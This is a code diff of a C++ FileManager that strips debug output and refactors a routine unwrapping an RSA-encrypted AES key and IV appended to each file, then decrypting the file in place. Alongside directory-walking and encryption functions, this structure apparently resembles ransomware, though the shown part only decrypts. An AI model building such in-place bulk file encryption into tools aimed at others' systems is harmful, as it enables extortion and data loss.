@@ -1,15 +1,14 @@
 #include "FileManager.h"
-#include "ext/base64.h"
 
 #include <filesystem>
 #include <iostream>
-#include <iomanip>
+#include <fstream>
 
 bool File::FilePathExists() {
     return std::filesystem::exists(Serialization::BytestringToString(this->m_Metadata.path));
 }
 
-File::File(std::string & path)
+File::File(std::string& path)
 {
     this->m_Metadata.path = Serialization::SerializeString(path);
 
@@ -50,6 +49,10 @@ bool File::WriteTo(std::string& data) {
     this->m_Metadata.contents = Serialization::SerializeString(data);
 
     return true;
+}
+
+std::string File::GetFilePath() {
+    return Serialization::BytestringToString(this->m_Metadata.path);
 }
 
 void FileManager::FindFiles(const std::string& startDirectory) {
@@ -100,27 +103,15 @@ void FileManager::EncryptContents(File& file) {
 }
 
 void FileManager::DecryptContents(File& file) {
-    OutputDebugStringA(std::string("Decrypting " + Serialization::BytestringToString(file.m_Metadata.name)).c_str());
-
-    if ( !this->m_EncryptionKeys.priv ) {
-        OutputDebugStringA("bad private key :(");
-    }
+    if ( !this->m_EncryptionKeys.priv )
+        return;
 
     BYTESTRING cipherText = Serialization::SerializeString(file.ReadFrom());
-    OutputDebugStringA("got cipher text");
-
     BYTESTRING AESIV(cipherText.end() - 16, cipherText.end()); cipherText.erase(cipherText.end() - 16, cipherText.end());
-    OutputDebugStringA("got aes iv");
     BYTESTRING AESKeyEncrypted(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end()); cipherText.erase(cipherText.end() - RSA_2048_DIGEST_BITS, cipherText.end());
     BYTESTRING AESKey = LGCrypto::RSADecrypt(AESKeyEncrypted, this->m_EncryptionKeys.priv, TRUE);
-    OutputDebugStringA("got aes key");
     BYTESTRING plaintext = LGCrypto::AESDecrypt(cipherText, AESKey, AESIV);
     std::string plaintextString = Serialization::BytestringToString(plaintext);
-    OutputDebugStringA("decrypted content");
 
     file.WriteTo(plaintextString);
 }
-
-//const BYTESTRING FileManager::TransformFile(File& file) {
-//    return {};
-//}
